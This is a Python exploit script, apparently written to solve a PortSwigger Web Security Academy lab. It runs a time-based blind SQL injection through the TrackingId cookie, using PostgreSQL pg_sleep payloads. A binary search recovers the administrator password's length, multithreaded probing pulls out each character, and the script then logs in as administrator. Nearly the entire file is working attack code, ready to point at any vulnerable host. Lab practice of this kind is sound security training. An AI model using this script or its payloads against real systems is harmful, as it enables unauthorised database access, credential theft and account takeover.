import requests
from typing import Optional, Any
import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

session = requests.Session()
BASE_URL = "https://0a4900d103be8007da8bbcb100c0008d.web-security-academy.net"
WORD_LIST = "0123456789abcdefghijklmnopqrstuvwxyz"

# Thread lock for printing
print_lock = threading.Lock()

def get_request(url: str, cookies: dict[str, Any] = None, timeout: int = 15) -> Optional[requests.Response]:
    try:
        return session.get(url, cookies=cookies, timeout=timeout)
    except requests.RequestException as e:
        with print_lock:
            print(f"Request error: {e}")
        return None

def payload_request(payload: str) -> Optional[requests.Response]:
    cookies = {
        "TrackingId": payload,
        "session": "aa"
    }
    return get_request(BASE_URL, cookies=cookies)



def find_pw_len(max_len: int = 25) -> int:
    """Find password length using binary search"""
    print("Finding password length...")
    low = 1
    high = max_len
    
    while low <= high:
        mid = (low + high) // 2
        payload = (
            f"';select case when (username='administrator' and length(password)>{mid}) "
            f"then pg_sleep(5) else pg_sleep(0) end from users-- "
        )
        
        print(f"Testing length > {mid}")
        start = time.time()
        response = payload_request(urllib.parse.quote(payload))
        elapsed = time.time() - start
        
        if elapsed > 4:
            low = mid + 1
        else:
            high = mid - 1
    
    print(f"Password length found: {low}")
    return low

def find_char_at_position(position: int) -> str:
    """Find the character at a specific position"""
    with print_lock:
        print(f"Starting search for position {position}")
    
    for char in WORD_LIST:
        payload = (
            f"';select case when (username='administrator' and "
            f"substring(password,{position},1)='{char}') "
            f"then pg_sleep(8) else pg_sleep(0) end from users-- "
        )
        
        start = time.time()
        response = payload_request(urllib.parse.quote(payload))
        elapsed = time.time() - start
        
        if response and response.status_code == 200 and elapsed > 7:
            with print_lock:
                print(f"*** FOUND: Position {position} = '{char}' ***")
            return char
    
    with print_lock:
        print(f"No character found for position {position}")
    return ''

def find_pw_parallel(pw_len: int, max_workers: int = None) -> str:
    """Find password using parallel position scanning"""
    if max_workers is None:
        max_workers = min(pw_len, 8)  # Don't exceed password length or reasonable limit
    
    password = [''] * pw_len
    
    print(f"Starting parallel password discovery for {pw_len} positions with {max_workers} workers...")
    
    # Execute position searches in parallel
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit one task per position
        future_to_position = {
            executor.submit(find_char_at_position, pos): pos
            for pos in range(1, pw_len + 1)
        }
        
        # Collect results
        for future in as_completed(future_to_position):
            position = future_to_position[future]
            try:
                char = future.result()
                password[position - 1] = char
                with print_lock:
                    print(f"Position {position} completed: '{char}'")
                    
            except Exception as e:
                with print_lock:
                    print(f"Task failed for position {position}: {e}")
                password[position - 1] = '?'  # Mark as failed
    
    result_pw = ''.join(password)
    print(f"Discovered password: '{result_pw}'")
    return result_pw

def post_request(url: str, data: dict[str, Any], timeout: int = 10) -> Optional[requests.Response]:
    try:
        return session.post(url, data=data, timeout=timeout)
    except requests.RequestException as e:
        print(f"POST error: {e}")
        return None

def get_csrf(url: str) -> Optional[str]:
    response = get_request(url)
    if not response:
        return None
        
    try:
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_input = soup.find("input", {"name": "csrf"})
        if csrf_input:
            return csrf_input.get("value")
    except ImportError:
        print("BeautifulSoup not available, trying manual parsing...")
        # Simple regex fallback
        import re
        match = re.search(r'name="csrf"\s+value="([^"]+)"', response.text)
        if match:
            return match.group(1)
    
    return None

def login(pw: str):
    print(f"Attempting login with password: '{pw}'")
    url = BASE_URL + "/login"
    csrf_token = get_csrf(url)
    
    if not csrf_token:
        print("Failed to get CSRF token")
        return
    
    data = {
        "csrf": csrf_token,
        "username": "administrator",
        "password": pw
    }
    
    response = post_request(url, data)
    if response and "Your username is: administrator" in response.text:
        print("*** LOGIN SUCCESS! ***")
    else:
        print("Login failed")

def main():
    print("Starting SQL injection attack...")
    print("Target:", BASE_URL)
    
    # Find password length
    pw_len = find_pw_len()
    
    if pw_len <= 0:
        print("Failed to determine password length")
        return
    
    # Find password using parallel scanning
    pw = find_pw_parallel(pw_len)  # Removed max_workers parameter
    
    if pw and len(pw) == pw_len:
        print(f"Password discovery complete: '{pw}'")
        # Attempt login
        login(pw)
    else:
        print(f"Password discovery incomplete. Found: '{pw}'")

if __name__ == "__main__":
    main()